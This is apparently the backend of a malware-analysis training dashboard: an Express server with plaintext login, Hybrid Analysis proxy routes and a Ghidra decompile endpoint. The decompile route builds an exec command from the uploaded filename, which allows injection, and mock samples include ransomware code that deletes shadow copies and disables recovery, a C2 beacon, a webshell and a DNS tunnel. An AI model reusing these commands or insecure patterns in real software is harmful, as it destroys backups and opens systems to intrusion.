const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const { exec } = require('child_process');

// Temp Directory Initialization
const TEMP_UPLOAD_DIR = path.join(__dirname, 'temp_uploads');
if (!fs.existsSync(TEMP_UPLOAD_DIR)) {
    fs.mkdirSync(TEMP_UPLOAD_DIR, { recursive: true });
}

// Multer Storage Configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, TEMP_UPLOAD_DIR);
    },
    filename: (req, file, cb) => {
        cb(null, `${Date.now()}_${file.originalname}`);
    }
});
const upload = multer({ storage: storage });

const app = express();
const PORT = 3000;
const DB_FILE = path.join(__dirname, 'users.json');

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Helper: Read Users
function readUsers() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            // Create if not exists
            const defaultData = [{ user: 'Analyst_01', pass: 'admin' }];
            fs.writeFileSync(DB_FILE, JSON.stringify(defaultData, null, 4));
            return defaultData;
        }
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        console.error('Error reading DB:', e);
        return [];
    }
}

// Helper: Write Users
function writeUsers(users) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 4));
        return true;
    } catch (e) {
        console.error('Error writing DB:', e);
        return false;
    }
}

// Routes

// 1. LOGIN
app.post('/api/login', (req, res) => {
    const { user, pass } = req.body;
    const users = readUsers();

    const validUser = users.find(u => u.user === user && u.pass === pass);

    if (validUser) {
        res.json({ success: true, user: validUser.user });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

// 2. REGISTER
app.post('/api/register', (req, res) => {
    const { user, pass } = req.body;

    if (!user || !pass) {
        return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const users = readUsers();

    // Check if exists
    if (users.find(u => u.user === user)) {
        return res.status(409).json({ success: false, message: 'User already exists' });
    }

    // Add new user
    users.push({ user, pass });

    if (writeUsers(users)) {
        res.json({ success: true, message: 'User created' });
    } else {
        res.status(500).json({ success: false, message: 'Database error' });
    }
});

// ---- Hybrid Analysis API Proxy Endpoints ----

// 1. Overview by Hash
app.get('/api/sandbox/overview/:hash', (req, res) => {
    const hash = req.params.hash;
    const apiKey = req.headers['x-ha-api-key'];
    if (!hash || !apiKey) {
        return res.status(400).json({ error: 'Missing hash or API key' });
    }

    const options = {
        hostname: 'www.hybrid-analysis.com',
        path: `/api/v2/overview/${hash}`,
        method: 'GET',
        headers: {
            'api-key': apiKey,
            'user-agent': 'Falcon Sandbox',
            'accept': 'application/json'
        }
    };

    const request = require('https').request(options, (response) => {
        let data = '';
        response.on('data', (chunk) => { data += chunk; });
        response.on('end', () => {
            try {
                res.status(response.statusCode).json(JSON.parse(data));
            } catch (e) {
                res.status(500).json({ error: 'Failed to parse Hybrid Analysis response', raw: data });
            }
        });
    });

    request.on('error', (e) => {
        res.status(500).json({ error: e.message });
    });

    request.end();
});

// 2. Report Job State
app.get('/api/sandbox/report/:jobId/state', (req, res) => {
    const jobId = req.params.jobId;
    const apiKey = req.headers['x-ha-api-key'];
    if (!jobId || !apiKey) {
        return res.status(400).json({ error: 'Missing jobId or API key' });
    }

    const options = {
        hostname: 'www.hybrid-analysis.com',
        path: `/api/v2/report/${jobId}/state`,
        method: 'GET',
        headers: {
            'api-key': apiKey,
            'user-agent': 'Falcon Sandbox',
            'accept': 'application/json'
        }
    };

    const request = require('https').request(options, (response) => {
        let data = '';
        response.on('data', (chunk) => { data += chunk; });
        response.on('end', () => {
            try {
                res.status(response.statusCode).json(JSON.parse(data));
            } catch (e) {
                res.status(500).json({ error: 'Failed to parse response' });
            }
        });
    });

    request.on('error', (e) => {
        res.status(500).json({ error: e.message });
    });

    request.end();
});

// 3. Report Job Summary
app.get('/api/sandbox/report/:jobId/summary', (req, res) => {
    const jobId = req.params.jobId;
    const apiKey = req.headers['x-ha-api-key'];
    if (!jobId || !apiKey) {
        return res.status(400).json({ error: 'Missing jobId or API key' });
    }

    const options = {
        hostname: 'www.hybrid-analysis.com',
        path: `/api/v2/report/${jobId}/summary`,
        method: 'GET',
        headers: {
            'api-key': apiKey,
            'user-agent': 'Falcon Sandbox',
            'accept': 'application/json'
        }
    };

    const request = require('https').request(options, (response) => {
        let data = '';
        response.on('data', (chunk) => { data += chunk; });
        response.on('end', () => {
            try {
                res.status(response.statusCode).json(JSON.parse(data));
            } catch (e) {
                res.status(500).json({ error: 'Failed to parse response' });
            }
        });
    });

    request.on('error', (e) => {
        res.status(500).json({ error: e.message });
    });

    request.end();
});

// Mock Decompiled Database for preloaded threat profiles
const MOCK_DECOMPILATIONS = {
    ransomware: [
        {
            name: "main",
            entry_point: "0x00401000",
            code: `int main(int argc, char **argv) {
    // BlackStorm Ransomware Main Entry
    if (check_admin_privileges() == 0) {
        printf("[!] Error: Administrator privileges required.\\n");
        exit(1);
    }
    
    establish_persistence();
    delete_shadow_copies();
    
    char *target_dir = "C:\\\\Users";
    encrypt_directory(target_dir);
    
    contact_c2_server("http://185.220.101.5/beacon");
    drop_ransom_note();
    return 0;
}`
        },
        {
            name: "delete_shadow_copies",
            entry_point: "0x00401240",
            code: `void delete_shadow_copies() {
    // Evasion: Disable backups and system recovery
    char *cmd = "vssadmin.exe delete shadows /all /quiet";
    char *cmd2 = "wbadmin delete catalog -quiet";
    char *cmd3 = "bcdedit /set {default} recoveryenabled No";
    
    ShellExecuteA(NULL, "open", "cmd.exe", "/c vssadmin.exe delete shadows /all /quiet", NULL, 0);
    ShellExecuteA(NULL, "open", "cmd.exe", "/c wbadmin delete catalog -quiet", NULL, 0);
    ShellExecuteA(NULL, "open", "cmd.exe", "/c bcdedit /set {default} recoveryenabled No", NULL, 0);
    printf("[*] VSS backups and recovery policies disabled.\\n");
}`
        },
        {
            name: "encrypt_directory",
            entry_point: "0x00401490",
            code: `void encrypt_directory(char *dir_path) {
    // Recursive file traversal logic
    HANDLE hFind;
    WIN32_FIND_DATA findData;
    char search_path[260];
    
    sprintf(search_path, "%s\\\\*", dir_path);
    hFind = FindFirstFile(search_path, &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                char full_path[260];
                sprintf(full_path, "%s\\\\%s", dir_path, findData.cFileName);
                
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    encrypt_directory(full_path); // Recurse subdirectory
                } else {
                    if (is_target_extension(findData.cFileName)) {
                        encrypt_file_aes(full_path);
                    }
                }
            }
        } while (FindNextFile(hFind, &findData));
        FindClose(hFind);
    }
}`
        },
        {
            name: "encrypt_file_aes",
            entry_point: "0x004017f0",
            code: `int encrypt_file_aes(char *file_path) {
    // AES-256 Key schedule and lock execution
    unsigned char key[32] = { 0x4f, 0xa1, 0xbc, 0x99, 0xef, 0x12, 0x5a, 0xd4, 0x77, 0x88, 0x99, 0xaa }; // Symmetric Key
    unsigned char iv[16] = { 0 };
    
    FILE *in = fopen(file_path, "rb");
    if (!in) return 0;
    
    char out_path[300];
    sprintf(out_path, "%s.locked", file_path);
    FILE *out = fopen(out_path, "wb");
    
    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    
    unsigned char buffer[4096];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), in)) > 0) {
        AES_CBC_encrypt_buffer(&ctx, buffer, bytes_read);
        fwrite(buffer, 1, bytes_read, out);
    }
    
    fclose(in);
    fclose(out);
    
    // Wipe original file contents from logical disk
    DeleteFileA(file_path);
    return 1;
}`
        },
        {
            name: "contact_c2_server",
            entry_point: "0x00401b20",
            code: `void contact_c2_server(char *c2_url) {
    // Network Socket C2 Beaconing
    HINTERNET hSession = InternetOpenA("BlackStormAgent", 1, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnectA(hSession, "185.220.101.5", 80, NULL, NULL, 3, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/beacon", NULL, NULL, NULL, 0, 0);
    
    char post_data[512];
    sprintf(post_data, "id=BlackStorm_Victim&status=encrypted&key=AES_256_RSA_WRAP");
    
    HttpSendRequestA(hRequest, NULL, 0, post_data, strlen(post_data));
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}`
        }
    ],
    webshell: [
        {
            name: "main",
            entry_point: "0x00401010",
            code: `int main(int argc, char **argv) {
    // PHP WebShell Handler Simulation
    char *input_cmd = get_request_parameter("cmd");
    char *auth_key = get_request_parameter("password");
    
    if (auth_key == NULL || strcmp(auth_key, "supersecurepassword") != 0) {
        render_login_page();
        return 0;
    }
    
    if (input_cmd != NULL) {
        execute_system_command(input_cmd);
    }
    return 0;
}`
        },
        {
            name: "execute_system_command",
            entry_point: "0x004011d0",
            code: `void execute_system_command(char *command) {
    // Shell execution backdoor
    printf("<pre>Executing Command Input: %s\\n", command);
    
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        printf("Error: Failed to bind stdout stream.</pre>");
        return;
    }
    
    char path[1035];
    while (fgets(path, sizeof(path), fp) != NULL) {
        printf("%s", path);
    }
    
    pclose(fp);
    printf("</pre>");
}`
        }
    ],
    dns_tunneling: [
        {
            name: "main",
            entry_point: "0x00401000",
            code: `int main(int argc, char **argv) {
    // dnstt DNS Tunneling Client Initiation
    char *dns_server = "dns.c2server.org";
    char *pubkey_hex = "f3e1a0b32c918a...";
    
    initialize_crypto_handshake(pubkey_hex);
    int sockfd = setup_udp_socket("8.8.8.8", 53);
    
    printf("[*] Tunneling network traffic over DNS queries to %s\\n", dns_server);
    tunnel_event_loop(sockfd, dns_server);
    return 0;
}`
        },
        {
            name: "tunnel_event_loop",
            entry_point: "0x00401340",
            code: `void tunnel_event_loop(int socket, char *dns_domain) {
    unsigned char payload[256];
    unsigned char dns_packet[512];
    
    while (1) {
        int bytes_to_send = read_local_stdin_or_shell(payload);
        if (bytes_to_send > 0) {
            build_dns_query_txt(dns_packet, payload, bytes_to_send, dns_domain);
            sendto(socket, dns_packet, sizeof(dns_packet), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
            
            // Listen for TXT record response
            unsigned char response[512];
            recvfrom(socket, response, sizeof(response), 0, NULL, NULL);
            process_dns_response_txt(response);
        }
        Sleep(100);
    }
}`
        },
        {
            name: "build_dns_query_txt",
            entry_point: "0x004016a0",
            code: `void build_dns_query_txt(unsigned char *packet, unsigned char *payload, int len, char *domain) {
    // Encodes payload as Base32/Base64 and embeds it into DNS labels
    char base32_payload[128];
    base32_encode(payload, len, base32_payload);
    
    // Format DNS Header
    sprintf(packet, "\\x00\\x00\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"); // DNS TXT
    append_dns_name(packet, base32_payload);
    append_dns_name(packet, domain);
    
    append_short(packet, 16); // Type TXT (16)
    append_short(packet, 1);  // Class IN
}`
        }
    ],
    clean: [
        {
            name: "main",
            entry_point: "0x00401020",
            code: `int main(int argc, char **argv) {
    // Clean utility: Gather local OS details
    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    
    GetVersionExW((OSVERSIONINFO*)&osvi);
    printf("Windows Version Details: %d.%d (Build %d)\\n", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    
    print_system_report();
    return 0;
}`
        },
        {
            name: "print_system_report",
            entry_point: "0x004011c0",
            code: `void print_system_report() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    printf("Logical Processors: %d\\n", si.dwNumberOfProcessors);
    printf("Processor Architecture: %d\\n", si.wProcessorArchitecture);
    printf("Virtual Memory Allocation Unit: %d bytes\\n", si.dwPageSize);
}`
        }
    ]
};

// Generates structural C output dynamically for any user file
function generateGenericDecompile(filename) {
    return [
        {
            name: "entry",
            entry_point: "0x00401000",
            code: `void entry(void) {
    // Main executable entry wrapper for: ${filename}
    __security_init_cookie();
    int return_code = main(0, NULL);
    exit(return_code);
}`
        },
        {
            name: "main",
            entry_point: "0x00401120",
            code: `int main(int argc, char **argv) {
    // Initializing runtime heuristics for: ${filename}
    printf("[*] Starting diagnostic runtime checks...\\n");
    int status = perform_startup_checks();
    if (status == 0) {
        printf("Analysis checks successful.\\n");
    } else {
        printf("Startup check failure code: %d.\\n", status);
    }
    return 0;
}`
        },
        {
            name: "perform_startup_checks",
            entry_point: "0x00401250",
            code: `int perform_startup_checks() {
    // Basic verification of loaded modules
    void *module = GetModuleHandleA(NULL);
    if (module == NULL) {
        return -1;
    }
    
    // Attempt standard virtual page allocation
    void *ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (ptr == NULL) {
        return -2;
    }
    
    VirtualFree(ptr, 0, MEM_RELEASE);
    return 0;
}`
        }
    ];
}

// 4. DECOMPILE (Ghidra Reverse Engineering Router)
app.post('/api/sandbox/decompile', upload.single('file'), (req, res) => {
    const file = req.file;
    const sampleType = req.body.sampleType; // ransomware, webshell, dns_tunneling, clean

    // Determine fallback content
    let fallbackData = MOCK_DECOMPILATIONS.clean;
    if (sampleType && MOCK_DECOMPILATIONS[sampleType]) {
        fallbackData = MOCK_DECOMPILATIONS[sampleType];
    } else if (file) {
        fallbackData = generateGenericDecompile(file.originalname);
    } else {
        fallbackData = generateGenericDecompile("suspicious_binary.exe");
    }

    if (!file) {
        // If no file was uploaded (preloaded samples select)
        return res.json({ success: true, isMock: true, data: fallbackData });
    }

    // Attempt to locate local Ghidra installation
    let ghidraPath = process.env.GHIDRA_PATH || 'C:\\ghidra';
    const userGhidraPath = 'C:\\Users\\Utente\\Downloads\\ghidra-Ghidra_12.1.3_build\\ghidra-Ghidra_12.1.3_build';
    
    if (fs.existsSync(userGhidraPath)) {
        ghidraPath = userGhidraPath;
    } else if (!fs.existsSync(ghidraPath)) {
        const standardProgramFiles = 'C:\\Program Files\\ghidra';
        if (fs.existsSync(standardProgramFiles)) {
            ghidraPath = standardProgramFiles;
        }
    }
    
    let headlessPath = '';
    const isWindows = process.platform === 'win32';

    if (isWindows) {
        headlessPath = path.join(ghidraPath, 'support', 'analyzeHeadless.bat');
    } else {
        headlessPath = path.join(ghidraPath, 'support', 'analyzeHeadless');
    }

    if (!fs.existsSync(headlessPath)) {
        console.warn(`[SANDBOX] Ghidra Headless Analyzer not found at: ${headlessPath}. Using mockup decompiler fallback.`);
        // Clean up uploaded file
        try { fs.unlinkSync(file.path); } catch (e) {}
        return res.json({ success: true, isMock: true, data: fallbackData });
    }

    // Build directories for Ghidra project database
    const uniqueId = Date.now();
    const projDir = path.join(__dirname, `ghidra_proj_${uniqueId}`);
    const outputJson = path.join(TEMP_UPLOAD_DIR, `decompile_${uniqueId}.json`);
    const scriptPath = __dirname; // decompile_script.py is located in the same directory as server.js

    console.log(`[SANDBOX] Spawning Ghidra Headless Analyzer on: ${file.path}`);
    const cmd = `"${headlessPath}" "${projDir}" TempProj_${uniqueId} -import "${file.path}" -scriptPath "${scriptPath}" -postScript decompile_script.py "${outputJson}" -deleteProject -overwrite`;

    exec(cmd, (error, stdout, stderr) => {
        // Clean up files
        try { fs.unlinkSync(file.path); } catch (e) {}
        try {
            if (fs.existsSync(projDir)) {
                fs.rmSync(projDir, { recursive: true, force: true });
            }
        } catch (e) {}

        if (error) {
            console.error('[SANDBOX] Ghidra execution failed, falling back to mock:', error);
            try { fs.unlinkSync(outputJson); } catch (e) {}
            return res.json({ success: true, isMock: true, data: fallbackData, error: error.message });
        }

        try {
            if (!fs.existsSync(outputJson)) {
                throw new Error('Decompilation script output file missing');
            }
            const data = JSON.parse(fs.readFileSync(outputJson, 'utf8'));
            fs.unlinkSync(outputJson);
            return res.json({ success: true, isMock: false, data: data });
        } catch (e) {
            console.error('[SANDBOX] Failed to parse Ghidra output JSON:', e);
            try { fs.unlinkSync(outputJson); } catch (e) {}
            return res.json({ success: true, isMock: true, data: fallbackData, error: e.message });
        }
    });
});

// Start Server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Persistence file: ${DB_FILE}`);
});
